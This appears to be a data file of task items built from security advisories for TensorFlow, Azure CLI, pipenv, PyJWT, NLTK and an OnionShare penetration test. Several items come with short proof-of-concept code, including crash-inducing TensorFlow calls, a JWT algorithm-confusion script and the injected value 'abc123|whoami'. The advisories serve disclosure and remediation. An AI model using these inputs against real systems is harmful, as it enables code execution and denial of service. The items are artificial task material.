Input: ### Impact\nA malicious user can cause a denial of service by altering a `SavedModel` such that [any binary op](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/kernels/cwise_ops_common.h#L88-L137) would trigger `CHECK` failures. This occurs when the protobuf part corresponding to the tensor arguments is modified such that the `dtype` no longer matches the `dtype` expected by the op. In that case, calling the templated binary operator for the binary op would receive corrupted data, due to the type confusion involved:\n\n```cc\nfunctor::BinaryFunctor<Device, Functor, 1>()(\n    eigen_device, out->template flat<Tout>(),\n    input_0.template flat<Tin>(), input_1.template flat<Tin>(),\n    error_ptr);\n```\nIf `Tin` and `Tout` don't match the type of data in `out` and `input_*` tensors then `flat<*>` would interpret it wrongly. In most cases, this would be a silent failure, but we have noticed scenarios where this results in a `CHECK` crash, hence a denial of service.\n\n### Patches\nWe have patched the issue in GitHub commit [a7c02f1a9bbc35473969618a09ee5f9f5d3e52d9](https://github.com/tensorflow/tensorflow/commit/a7c02f1a9bbc35473969618a09ee5f9f5d3e52d9).\nThe fix will be included in TensorFlow 2.8.0.

Input: ### Impact\nThere is a typo in TensorFlow's [`SpecializeType`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/framework/full_type_util.cc#L81-L102) which results in heap OOB read/write:\n\n```cc\nfor (int i = 0; i < op_def.output_arg_size(); i++) {\n  // ...\n  for (int j = 0; j < t->args_size(); j++) {\n    auto* arg = t->mutable_args(i);\n    // ...\n  }\n} \n```\n\nDue to a typo, `arg` is initialized to the `i`th mutable argument in a loop where the loop index is `j`. Hence it is possible to assign to `arg` from outside the vector of arguments.

These commands are being executed using the executable\u2019s name and not its absolute path.\n\nThis can lead to the execution of untrusted code due to the way Windows resolves executable names to paths. Unlike Linux-based operating systems, Windows searches for the executable in the current directory first and looks in the paths that are defined in the `PATH` environment variable afterward. If the current directory contains unknown and thus potentially malicious files, the directory could contain an executable named `git.exe` which would be executed by Poetry.\n\nPoetry calls executables by name when handling dependencies from Git. Note that there might be even more places where Poetry calls executables by name.\n\n### Impact\n\nThis vulnerability can lead to Arbitrary Code Execution, which would lead to the takeover of the system. If a developer is exploited, the attacker could steal credentials or persist their access. If the exploit happens on a server, the attackers could use their access to attack other internal systems.\nSince this vulnerability requires a fair amount of user interaction, it is not as dangerous as a remotely exploitable one. However, it still puts developers at risk when dealing with untrusted files in a way they think is safe, because the exploit still works when the victim tries to make\n \nsure nothing can happen, e.g. by checking that the referenced Git dependency is not malicious and points to a trusted Git repository.\nThe victim could also not protect themself by vetting any Git or Poetry config files that might be present in the directory, because the behavior is undocumented. This kind of attack vector has been used in the past to target security researchers by sending them projects to collaborate on, so we believe that there is a non-negligible risk.\n\n### Patches\n\n1.1.9 || 1.2.0b1\n\n### Remediation\n\nUpgrade to version 1.1.9 || 1.2.0b1\n\n### References\n\n[Fix PR](https://github.com/python-poetry/poetry-core/pull/204)\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Email us at [security@python-poetry.org](mailto:security@python-poetry.org)\n.

Please identify the software name affected by it. Input: # Description\n\nIn versions previous to 2.40.0, Azure CLI contains a vulnerability for potential code injection. Critical scenarios are where a hosting machine runs an Azure CLI command where parameter values have been provided by an external source. \n\nFor example: Application X is a web application with a feature that allows users to create Secrets in an Azure KeyVault. Instead of constructing API calls based on user input, Application X uses Azure CLI commands to create the secrets. Application X has input fields presented to the user and the Azure CLI command parameter values are filled based on the user input fields. This input, when formed correctly, could potentially be run as system commands. Below is an example of the resulting Azure CLI command run on the web app's hosting machine. \n\n```bash\naz keyvault secret set --vault-name SomeVault --name foobar --value \"abc123|whoami\"\n```\n\nThe above command could potentially run the `whoami` command on the hosting machine.\n\nInteractive, in-terminal use and automation/pipeline scenarios have not been identified as critical risk scenarios.\n\n## Code injection prerequisites\n\nThe vulnerability is only applicable when the Azure CLI command is run on a Windows machine **_and_** with any version of PowerShell **_and_**when the parameter value contains the `&` or `|` symbols. If any of these prerequisites are not met, this vulnerability is not applicable.\n\n### 1. The command has to be run on Windows\n\nThe Azure CLI has an entry script that, when run on Windows, calls cmd.exe to then call Python. This leads into the next prerequisite.\n\n### 2. The command has to be executed by PowerShell.\n\nPowerShell has input parsing designs that strip out the quotation marks of input with the expectation that it will be taken as a string. When used in a PowerShell environment, the command is input like the above command. However, when it passes through PowerShell into cmd.exe, it looks like the following. \n\n```powershell\naz keyvault secret set --vault-name SomeVault --name foobar --value abc123|whoami\n```\n\nThis leads to the 3rd prerequisite as it won\u2019t just try to run any parameter value as a command. \n\n### 3. The parameter value has to contain a `&` or `|` symbols\n\nIn cmd.exe, the `&` and `|` symbols invoke command execution. When a string containing this symbols is passed directly to cmd.exe, quotes are kept and command execution is invoked. However, When a string is passed into PowerShell, the quotes are stripped and passed into cmd.exe making it open to execution.\n\nSo, in the `keyvault` example above, the `abc123` portion of the value will be accepted correctly but the value after the `|` symbol will be interpreted as a command. \n\n# Impact\n\n## Code injection\n\nAs mentioned in the above scenario where the value is being provided by and outside source to run an Azure CLI command, system commands or even scripts could be run on a hosting machine. \n\n# Patches\n\nUpgrade to Azure CLI 2.40.0 or greater. \n\nAs of Azure CLI 2.40.0, a new .ps1 entry script is used as the entry point to call Python rather than cmd.exe. This removes the opportunity for cmd.exe to interpret input as a command invocation. Using this approach has introduced new issues however that you can read about in the \"More information\" section.\n\nUpgrade to 2.41.0 or greater and manually call the azps.ps1 entry script in identified critical scenarios.\n\nIn Azure CLI 2.41.0 we have [reverted back](https://github.com/Azure/azure-cli/pull/24015) to using the cmd.exe entry script as the default while keeping the azps.ps1 entry script for manual Azure CLI calls if users require it.\n\n```powershell\nC:\\Program Files (x86)\\Microsoft SDKs\\Azure\\CLI2\\wbin\\azps.ps1 keyvault secret set --vault-name SomeVault --name foobar --value \"abc123|whoami\"\n```\n\n## More information\n\n### PowerShell Parsing with Azure CLI\n\nPowerShell\u2019s input parsing design has caused regressions and issues in Azure CLI\u2019s behavior resulting in broken scripts and pipelines.  Below are the known issues and links to GitHub issues. This should not be taken as a complete list since these are **_only the reported_** issues. Users should verify command effectiveness before use in production environments.\n\n1. [PowerShell arrays can't be passed to Azure CLI](https://github.com/Azure/azure-cli/issues/23797)\n2. [Argument passthrough token (`--`) doesn't work with Azure CLI in PowerShell](https://github.com/Azure/azure-cli/issues/24034)\n3.

[Azure CLI can no longer be invoked by `Start-Process`](https://github.com/Azure/azure-cli/pull/24015)\n\nTo avoid these breaking changes, in Azure CLI 2.41.0 we have [reverted back](https://github.com/Azure/azure-cli/pull/24015) to using the cmd.exe entry script as the default while keeping the azps.ps1 entry script for manual Azure CLI calls if users require it.\n\n> \ud83d\uddd2\ufe0f The .ps1 entry script is only required for similarly identified scenarios like the example above. Interactive use and automation scenarios have not been identified as high risk.\n\nIf the azps.ps1 script is needed, you can call it like this: \n\n```powershell\nC:\\Program Files (x86)\\Microsoft SDKs\\Azure\\CLI2\\wbin\\azps.ps1 vm create\n```\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [Azure CLI GitHub repo](https://github.com/Azure/azure-cli)\n* Email us at [AzPyCLI@microsoft.com](mailto:AzPyCLI@microsoft.com)\n.

Input: ### Impact\n\nThis vulnerability creates a false sense of security for keylime users -- i.e. a user could query keylime and conclude that a parcitular node/agent is correctly attested, while attestations are not in fact taking place.\n\n**Short explanation**: the keylime verifier creates periodic reports on the state of each attested agent. The keylime verifier runs a set of python asynchronous processes to challenge attested nodes and create reports on the outcome. \n\nThe vulnerability consists of the above named python asynchronous processes failing silently, i.e. quitting without leaving behind a database entry, raising an error or producing even a mention of an error in a log. The silent failure can be triggered by a small set of transient network failure conditions; recoverable device driver crashes being one such condition we saw in the wild.\n\n### Patches\n\nThe problem is fixed in keylime starting with tag 6.5.1\n\n### Workarounds\n\nThis [patch](https://github.com/keylime/keylime/pull/1128/files) can be retroactively applied to any running keylime deployment.\nOnly running verifiers need to be patched.\nAfter the patch is applied, the keylime verifier needs to be restarted.\n\n### References\n\nThe problem, as well as the proposed fix, are described in detail [here](https://github.com/keylime/keylime/pull/1128).\nFurther details about the system where the bug was found, and the conditions in which the bug was found, are available from @galmasi on demand.\n\n### For more information\n\nIf you have any questions or comments about this [advisory](https://github.com/keylime/keylime/security/advisories/GHSA-hff2-x2j9-gxgv), please comment at the bottom of the advisory itself.\n.

Eve seemingly leaves the chatroom, which leads Bob and Alice to believe they are having a private chat. The last screenshot shows that Eve only emitted the leave message and is still able to read the chat and possibly write messages.\n\nThis can be reproduced by joining the chat with two different instances, where one instance has slightly modified the client-side JavaScript code similar to OTF-003 (page 22). The joined emit needs to be removed from the connect event handler. Therefore the modified client is not listed in the userlist and has no active session. The modified non-listed user also needs to change their username to Eve, which is not shown in the chatroom. The modified client then emits the disconnect event and their connection is no longer usable.\n\nThis results in the leave message for Eve and the removal from the user-list but not in removal of the original session of the Eve who announced to join the chat.\n\n## Impact:\n\nAn adversary with access to the chat environment can spoof his leave event but still persist in the chat with access to all sent messages and the possibility to write in the chat using OTF-003 (page 22).\n\n## Recommendation:\n\n- Implement proper session handling.

Roughly 20 bytes lead to 2GB memory consumption and this can be triggered multiple times. To be abused, this vulnerability requires rendering in the history tab, so some user interaction is required. The issue is in the process of disclosure to the QT security mailing list.

Because of the way that static files were being served, someone who generated a public Gradio link and shared it with others would potentially be exposing the files on the computer that generated the link, while the link was active. An attacker would be able to view the contents of a file on the computer if they knew the exact relative filepath. We do not have any evidence that this was ever exploited, but we treated the issue seriously and immediately took steps to mitigate it (see below)\n\n### Response\n1. We worked with @haby0 to immediately patch the issue and released a new version, `gradio 2.5.0`, within 24 hours of the issue being brought to our attention \n2.

You may want to call setTextFormat() explicitly, e.g. in case you expect the text to be in plain format but cannot control the text source (for instance when displaying data loaded from the Web).\n\nThis path is used in all components for displaying the server access history. This leads to a rendered HTML4 Subset (QT RichText editor) in the Onionshare frontend.\n\nIn the following example an adversary injects a crafted image file into an Onionshare instance with receive mode and renders it in the history component of the Onionshare application.\n\nThe only requirement is another visit to the shared site with the following parameter attached to the path of the URL:\n\n```\n<img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAIAAAACUFjqAAAAFElEQVQY02Nk+M+ABzAxMIxKYwIAQC0BEwZFOw4AAAAASUVORK5CYII=' />\n```\n\nThis will be rendered as a green square in the history tab where the path value is supposed to be (the value itself is shown at the bottom of the page).\n\n![otf-001](https://user-images.githubusercontent.com/156128/140665358-ab9e5990-3e13-4e50-85fd-b8a6e323d299.png)\n\nPossible scenarios where this could lead to remote code execution would be a 0-day in libpng or other internal image rendering (OTF-014 (page 12)) of the QT framework.\n\nThe QT documentation indicates that external files could be rendered, but we were unable to find a QT code path allowing for it.\n\n## Impact:\n\nAn adversary with knowledge of the Onion service address in public mode or with authentication in private mode can render arbitrary HTML (QT-HTML4 Subset) in the server desktop application.

Then the non-listed user squad-nursing writes a message in the chatroom without being visible in the list of users. The sending of the message itself is not required but was done here to show the initial access. The non-listed participant now renames himself to Bob and writes another message, seemingly coming from Bob.\n\nThis can be reproduced by slightly modifying the client-side JavaScript. The `joined` emit needs to be removed from the `socket.on(connect) `event handler. Therefore a client is not listed in the userlist and has no active session.\n\nhttps://github.com/onionshare/onionshare/blob/d08d5f0f32f755f504494d80794886f346fbafdb/cli/onionshare_cli/resources/static/js/chat.js#L16-L18\n\nThis can be done either via a crafted client or runtime modification of the `chat.js` script in the browser's internal debugger.\n\nIt is still possible to call the text method and send text to the chat via websocket.\n\nhttps://github.com/onionshare/onionshare/blob/d08d5f0f32f755f504494d80794886f346fbafdb/cli/onionshare_cli/web/chat_mode.py#L131-L139\n\nIt is also possible to call the `update_username` function and choose an existing username from the chat.\n\nhttps://github.com/onionshare/onionshare/blob/d08d5f0f32f755f504494d80794886f346fbafdb/cli/onionshare_cli/web/chat_mode.py#L141-L162\n\nAfterwards the hidden user can send messages that are displayed as coming from the impersonated user. There is no way to distinguish between the fake and original message.\n\n## Impact:\n\nAn adversary with access to the chat environment can impersonate existing chat participants and write messages but not read the conversation. The similar exploit described in OTF-004 (page 19) has only slightly more requirements but also allows for reading.\n\n## Recommendation:\n\n- Implement proper session handling.

It is still possible to send messages in the chatroom.\n\nIf a user decides to abuse OTF-003 (page 22) he can impersonate messages from existing users; others would not be able to distinguish original and faked messages.

It is not possible to configure this CSP for individual pages and therefore the security enhancement cannot be used for websites using javascript or external resources like fonts or images.\n\nIf CSP were configurable, the website creator could harden it accordingly to the needs of the application.\n\nAs this issue correlates with the Github issue for exposing the flask application directly (https://github.com/onionshare/ onionshare/issues/1389), it can be assumed that this can be solved by either changing to a well-known webserver, which supports this kind of configuration, or enhancing the status quo by making the CSP a configurable part of each website.\n\nWe believe that bundling the nginx or apache webserver would add complexity and dependencies to the application that could result in a larger attack surface - as these packages receive regular security updates. On the other hand it is not recommended to directly expose the flask webserver, due to lack of hardening. This is a trade-off which needs to be evaluated by the Onionshare developers, as multiple features are involved. Ideally the application user could choose between the built-in flask webserver or a system webserver of choice.\n\n## Impact:\n\nAs this is a general weakness and not a direct vulnerability in the Onionshare application, the direct impact of this issue is rather low.\n\n## Recommendation:\n\n- Consider offering a configurable webserver choice\n- Consider configurable CSP.

Input: ### Impact\nThe vulnerability is present in [`PunktSentenceTokenizer`](https://www.nltk.org/api/nltk.tokenize.punkt.html#nltk.tokenize.punkt.PunktSentenceTokenizer), [`sent_tokenize`](https://www.nltk.org/api/nltk.tokenize.html#nltk.tokenize.sent_tokenize)  and [`word_tokenize`](https://www.nltk.org/api/nltk.tokenize.html#nltk.tokenize.word_tokenize). Any users of this class, or these two functions, are vulnerable to a Regular Expression Denial of Service (ReDoS) attack. \nIn short, a specifically crafted long input to any of these vulnerable functions will cause them to take a significant amount of execution time. The effect of this vulnerability is noticeable with the following example:\n```python\nfrom nltk.tokenize import word_tokenize\n\nn = 8\nfor length in [10**i for i in range(2, n)]:\n    # Prepare a malicious input\n    text = \"a\" * length\n    start_t = time.time()\n    # Call `word_tokenize` and naively measure the execution time\n    word_tokenize(text)\n    print(f\"A length of {length:<{n}} takes {time.time() - start_t:.4f}s\")\n```\nWhich gave the following output during testing:\n```python\nA length of 100      takes 0.0060s\nA length of 1000     takes 0.0060s\nA length of 10000    takes 0.6320s\nA length of 100000   takes 56.3322s\n...\n```\nI canceled the execution of the program after running it for several hours.\n\nIf your program relies on any of the vulnerable functions for tokenizing unpredictable user input, then we would strongly recommend upgrading to a version of NLTK without the vulnerability, or applying the workaround described below.\n\n### Patches\nThe problem has been patched in NLTK 3.6.6. After the fix, running the above program gives the following result:\n```python\nA length of 100      takes 0.0070s\nA length of 1000     takes 0.0010s\nA length of 10000    takes 0.0060s\nA length of 100000   takes 0.0400s\nA length of 1000000  takes 0.3520s\nA length of 10000000 takes 3.4641s\n```\nThis output shows a linear relationship in execution time versus input length, which is desirable for regular expressions.\nWe recommend updating to NLTK 3.6.6+ if possible.\n\n### Workarounds\nThe execution time of the vulnerable functions is exponential to the length of a malicious input. With other words, the execution time can be bounded by limiting the maximum length of an input to any of the vulnerable functions. Our recommendation is to implement such a limit.\n\n### References\n* The issue showcasing the vulnerability: https://github.com/nltk/nltk/issues/2866\n* The pull request containing considerably more information on the vulnerability, and the fix: https://github.com/nltk/nltk/pull/2869\n* The commit containing the fix: 1405aad979c6b8080dbbc8e0858f89b2e3690341\n* Information on CWE-1333: Inefficient Regular Expression Complexity: https://cwe.mitre.org/data/definitions/1333.html\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [github.com/nltk/nltk](https://github.com/nltk/nltk)\n* Email us at [nltk.team@gmail.com](mailto:nltk.team@gmail.com)\n.

We tried to upload multiple files in the web interface during the attack and were not successful.\n\nThe failsafe is used to prevent creating more than 100 directories per second:\n\nhttps://github.com/onionshare/onionshare/blob/d08d5f0f32f755f504494d80794886f346fbafdb/cli/onionshare_cli/web/receive_mode.py#L386-L427\n\nThe limit of 100 requests/second is significantly lower than the possible network bandwidth and greatly reduces the attack complexity for denial of service. Our test was conducted over the tor network, which showed no limitation for the required bandwidth.\n\n## Impact:\n\nAn adversary with access to the receive mode can block file upload for others. There is no way to block this attack in public mode due to the anonymity properties of the tor network.\n\n## Recommendation:\n\n- Remove this limitation, or\n- Derive directory name from milliseconds\n.

Please identify the software name affected by it. Input: ## Issue Summary\nDue to a flaw in pipenv's parsing of requirements files, an attacker can insert a specially crafted string inside a comment anywhere within a requirements.txt file, which will cause victims who use pipenv to install the requirements file (e.g. with \"`pipenv install -r requirements.txt`\") to download dependencies from a package index server controlled by the attacker. By embedding malicious code in packages served from their malicious index server, the attacker can trigger arbitrary remote code execution (RCE) on the victims' systems.\n\n### Impact\nThe impact of successful exploitation is **severe/critical**.\n\nIf an attacker is able to hide a malicious `--index-url` option in a requirements file that a victim installs with pipenv, the attacker can embed arbitrary malicious code in packages served from their malicious index server that will be executed on the victim's host during installation (remote code execution/RCE). Exploitation using this technique would be relatively simple to achieve for an attacker with basic knowledge of Python, as the attacker can simply build a source distribution for any of the packages specified in the requirements file, and embed arbitrary malicious code in the setup.py file. When pip installs from a source distribution, any code in the setup.py is executed by the install process.\n\nBasic attacks might use the initial RCE triggered when a victim installs the attacker's malicious package to steal credentials from the victim's host, leach the host's resources to mine cryptocurrency, or install exploit kits or other malware. More sophisticated attackers may use more advanced techniques to persist access to the victim's host, hide or remove evidence of their attack by deleting references to the malicious index server in the Pipfile and Pipfile.lock generated by pipenv or other potential indicators of compromise. Highly sophisticated attackers could attempt to pivot to additional targets from the initial compromised host, and might leverage any exposed credentials in the compromised host environment or implicit authorization granted to the host to gain privileged access to other systems or resources, such as source repositories or package registries.\n\n### Likelihood\nThe overall likelihood of exploitation is **low to moderate** depending on a range of factors.\n\nThe primary hurdle to successful exploitation of this vulnerability depends on an attacker's ability to surreptitiously insert a specially crafted string into a requirements.txt file which will be installed by a victim (or victims). Unfortunately, because the attacker can insert this string into a comment, the attacker's ability to evade suspicion is greatly increased, and they may even be able to hide the initial payload in plain sight if a victim assumes that comments will be ignored by pipenv as expected.\n\nIn many common usage contexts \u2014 for example in environments where a requirements file is used to lock or \"freeze\" dependency versions for reproducible builds \u2014 requirements files can often become quite large, particularly when leveraging pip's integrity checking, which requires every dependency specified in the requirements file to includes hashes for all of its distribution files. In such cases, a malicious actor might mask an exploitation attempt by opening a pull request ostensibly to update or \"bump\" the project's dependencies to their latest versions, but surreptitiously insert a malicious `\u2014index-url` option amidst the many other changes associated with updating the dependencies in a lock file. As these dependency updates often result in hundreds or even thousands of changes spread across the requirements file and are not easy to review manually, such an attack could be difficult to identify or prevent without tools or other mitigating controls.\n\nMoreover, because the `argparse` module is used to parse the `--index-url`, `--extra-index-url`, and `--trusted-host` options, an attacker's ability to obfuscate their payload and hide their malicious intent is even more greatly enhanced, as the attacker may use abbreviated option names, which are supported by default with `argparse`. For example, an attacker can insert the string, \"`--t pypi.org`\" into a comment anywhere in the requirements file, which will automatically be expanded to \"`--trusted-host pypi.org`\" during processing by pipenv. This \"`--trusted-host pypi.org`\" option will disable SSL/TLS validation when pipenv attempts to connect to the default/official package index server (https://pypi.org/simple), and could allow a malicious index server to pose as the pipi.org index server in a man-in-the-middle attack.\n\nSetting up the malicious index server to serve compromised package versions is relatively simple, even for a non-sophisticated attacker. As `pip` uses a simple directory format for serving packages, the malicious packages simply need to be placed in the correct folder structure and served using an HTTP server with autoindex enabled (e.g. `python3 -m http.server`).\n\nPackaging up the exploit code into the malicious package versions would also be trivial for an attacker with basic knowledge of Python development, as the attacker can simply clone the source code for any of the packages specified in the requirements file, embed their malicious exploit code in the cloned package's setup.py file, and then build a source distribution of the package. When pip installs a package from a source distribution, any code in the setup.py is executed by the install process.\n\n### Additional Context & Details\nAccording to the requirements file format specification (https://pip.pypa.io/en/stable/reference/requirements-file-format/#comments), any lines which begin with a \"#\" character, and/or any text in a line following a whitespace and a \"#\" character, should be interpreted as a comment which will be removed/ignored during processing of the requirements file.\n\nHowever, due to a flaw in pipenv's parsing of requirements files, an attacker can insert a specially crafted string inside a comment anywhere within a requirements.txt file, which will cause victims who use pipenv to install the requirements file (e.g. with \"`pipenv install -r requirements.txt`\") to download dependencies from a package index server controlled by the attacker. By embedding malicious code in packages served from their malicious index server, the attacker is then able to gain arbitrary remote code execution on the victims' systems.\n\nThe vulnerable requirements file parsing code is in the parse_indexes(str: line) function of the pipenv.utils module:\n\nhttps://github.com/pypa/pipenv/blob/cdde3f7bcee6bacba89538f73aba9401337be10c/pipenv/utils.py#L2061-L2078\n\nThis function is called iteratively on each line of a requirements file, and uses the argparse module to find and process `--index-url`, `--extra-index-url`, and `--trusted-host` options (and variations thereof). However, it does not ignore these options when they appear in comments, or validate that these options appear on their own lines as required by the requirements file specification (see: https://pip.pypa.io/en/stable/reference/requirements-file-format/#global-options). The options can also be abbreviated due to default behavior provided by the `argparse.ArgumentParser` object used to parse these options in the requirements file, so that `--trusted-host` and `--t` will be treated as equivalent by pipenv, for example.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [https://github.com/pypa/pipenv/](https://github.com/pypa/pipenv/)\n* Contact the pipenv maintainers:\n  * [Dan Ryan](https://github.com/techalchemy)\n  * [Tzu-ping Chung](https://github.com/uranusjr)\n  * [Nate Prewitt](https://github.com/nateprewitt)\n* Contact the contributor who discovered the issue and authored this report:\n  * [Chris Passarello](https://github.com/milo-minderbinder).

Input: Between September 26, 2021 and October 8, 2021, [Radically Open Security](https://www.radicallyopensecurity.com/) conducted a penetration test of OnionShare 2.4, funded by the Open Technology Fund's [Red Team lab](https://www.opentech.fund/labs/red-team-lab/). This is an issue from that penetration test.\n\n- Vulnerability ID: OTF-013\n- Vulnerability type: Improper Hardening\n- Threat level: Low\n\n## Description:\n\nThe filesystem restriction could be hardened and should only allow for pre-defined subfolders.\n\n## Technical description:\n\nThe Flatpak and Snap configurations allow for read-only access on the whole home folder. The relevant lines in the configuration files are `onionshare/snap/snapcraft.yaml#L20` and `onionshare/flatpak/org.onionshare.OnionShare.yaml#L19` , respectively.\n\nThe encapsulation of filesystem access via these mechanisms should be restricted to pre-defined folders and not allow for access to (configuration) files outside the Onionshare-specific folders.\n\nSadly Snap does not allow for further restriction to specific folders and therefore cannot be further hardened. By default both frameworks disallow access to hidden folders and therefore reduce the potential impact.\n\n## Impact:\n\nAn adversary with a primitive that allows for filesystem access from the context of the Onionshare process can access sensitive files in the entire user home folder. This could lead to the leaking of sensitive data. Due to the automatic exclusion of hidden folders, the impact is reduced.\n\n## Recommendation:\n\n- Reduce read access in Flatpak configuration..

It also tried to access individual tensor bytes through `tensor.data()` of size `AllocatedBytes()`.  This led to ASAN failures because the `AllocatedBytes()` is an estimate of total bytes allocated by a tensor, including any pointed-to constructs (e.g. strings), and does not refer to contiguous bytes in the `.data()` buffer.  We couldn't use this byte vector anyways, since types like `tstring` include pointers, whereas we need to hash the string values themselves.\n\n### Patches\nWe have patched the issue in GitHub commit [1b85a28d395dc91f4d22b5f9e1e9a22e92ccecd6](https://github.com/tensorflow/tensorflow/commit/1b85a28d395dc91f4d22b5f9e1e9a22e92ccecd6).\n\nThe fix will be included in TensorFlow 2.9.0.

This results in a `CHECK`-failure which can be used to trigger a denial of service attack:\n\n```python\nimport tensorflow as tf\n\nhandle = tf.constant(\"[]\", shape=[0], dtype=tf.string)\ntf.raw_ops.DeleteSessionTensor(handle=handle)\n```\n  \nThe code assumes `handle` is a scalar but there is no validation for this:\n  \n```cc\n    const Tensor& handle = ctx->input(0);\n    const string& name = handle.scalar<tstring>()();\n```\n\n### Patches\nWe have patched the issue in GitHub commit [cff267650c6a1b266e4b4500f69fbc49cdd773c5](https://github.com/tensorflow/tensorflow/commit/cff267650c6a1b266e4b4500f69fbc49cdd773c5).\n\nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University..

Who is impacted?_\n\nDisclosed by Aapo Oksman (Senior Security Specialist, Nixu Corporation).\n\n> PyJWT supports multiple different JWT signing algorithms. With JWT, an \n> attacker submitting the JWT token can choose the used signing algorithm.\n> \n> The PyJWT library requires that the application chooses what algorithms \n> are supported. The application can specify \n> \"jwt.algorithms.get_default_algorithms()\" to get support for all \n> algorithms. They can also specify a single one of them (which is the \n> usual use case if calling jwt.decode directly. However, if calling \n> jwt.decode in a helper function, all algorithms might be enabled.)\n> \n> For example, if the user chooses \"none\" algorithm and the JWT checker \n> supports that, there will be no signature checking. This is a common \n> security issue with some JWT implementations.\n> \n> PyJWT combats this by requiring that the if the \"none\" algorithm is \n> used, the key has to be empty. As the key is given by the application \n> running the checker, attacker cannot force \"none\" cipher to be used.\n> \n> Similarly with HMAC (symmetric) algorithm, PyJWT checks that the key is \n> not a public key meant for asymmetric algorithm i.e. HMAC cannot be used \n> if the key begins with \"ssh-rsa\". If HMAC is used with a public key, the \n> attacker can just use the publicly known public key to sign the token \n> and the checker would use the same key to verify.\n> \n>  From PyJWT 2.0.0 onwards, PyJWT supports ed25519 asymmetric algorithm. \n> With ed25519, PyJWT supports public keys that start with \"ssh-\", for \n> example \"ssh-ed25519\".\n\n```python\nimport jwt\nfrom cryptography.hazmat.primitives import serialization\nfrom cryptography.hazmat.primitives.asymmetric import ed25519\n\n# Generate ed25519 private key\nprivate_key = ed25519.Ed25519PrivateKey.generate()\n\n# Get private key bytes as they would be stored in a file\npriv_key_bytes = \nprivate_key.private_bytes(encoding=serialization.Encoding.PEM,format=serialization.PrivateFormat.PKCS8, \nencryption_algorithm=serialization.NoEncryption())\n\n# Get public key bytes as they would be stored in a file\npub_key_bytes = \nprivate_key.public_key().public_bytes(encoding=serialization.Encoding.OpenSSH,format=serialization.PublicFormat.OpenSSH)\n\n# Making a good jwt token that should work by signing it with the \nprivate key\nencoded_good = jwt.encode({\"test\": 1234}, priv_key_bytes, algorithm=\"EdDSA\")\n\n# Using HMAC with the public key to trick the receiver to think that the \npublic key is a HMAC secret\nencoded_bad = jwt.encode({\"test\": 1234}, pub_key_bytes, algorithm=\"HS256\")\n\n# Both of the jwt tokens are validated as valid\ndecoded_good = jwt.decode(encoded_good, pub_key_bytes, \nalgorithms=jwt.algorithms.get_default_algorithms())\ndecoded_bad = jwt.decode(encoded_bad, pub_key_bytes, \nalgorithms=jwt.algorithms.get_default_algorithms())\n\nif decoded_good == decoded_bad:\n \u00a0\u00a0\u00a0 print(\"POC Successfull\")\n\n# Of course the receiver should specify ed25519 algorithm to be used if \nthey specify ed25519 public key.

Input: ### Impact\nThe implementation of `tf.raw_ops.SpaceToBatchND` (in all backends such as XLA and handwritten kernels) is vulnerable to an integer overflow:\n\n```python\nimport tensorflow as tf\n\ninput = tf.constant(-3.5e+35, shape=[10,19,22], dtype=tf.float32)\nblock_shape = tf.constant(-1879048192, shape=[2], dtype=tf.int64)\npaddings = tf.constant(0, shape=[2,2], dtype=tf.int32)\ntf.raw_ops.SpaceToBatchND(input=input, block_shape=block_shape, paddings=paddings)\n```\n\nThe result of this integer overflow is used to allocate the output tensor, hence we get a denial of service via a `CHECK`-failure (assertion failure), as in [TFSA-2021-198](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md).\n\n### Patches\nWe have patched the issue in GitHub commit [acd56b8bcb72b163c834ae4f18469047b001fadf](https://github.com/tensorflow/tensorflow/commit/acd56b8bcb72b163c834ae4f18469047b001fadf).\n  \nThe fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.\n  \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n  \n### Attribution\nThis vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.\n.
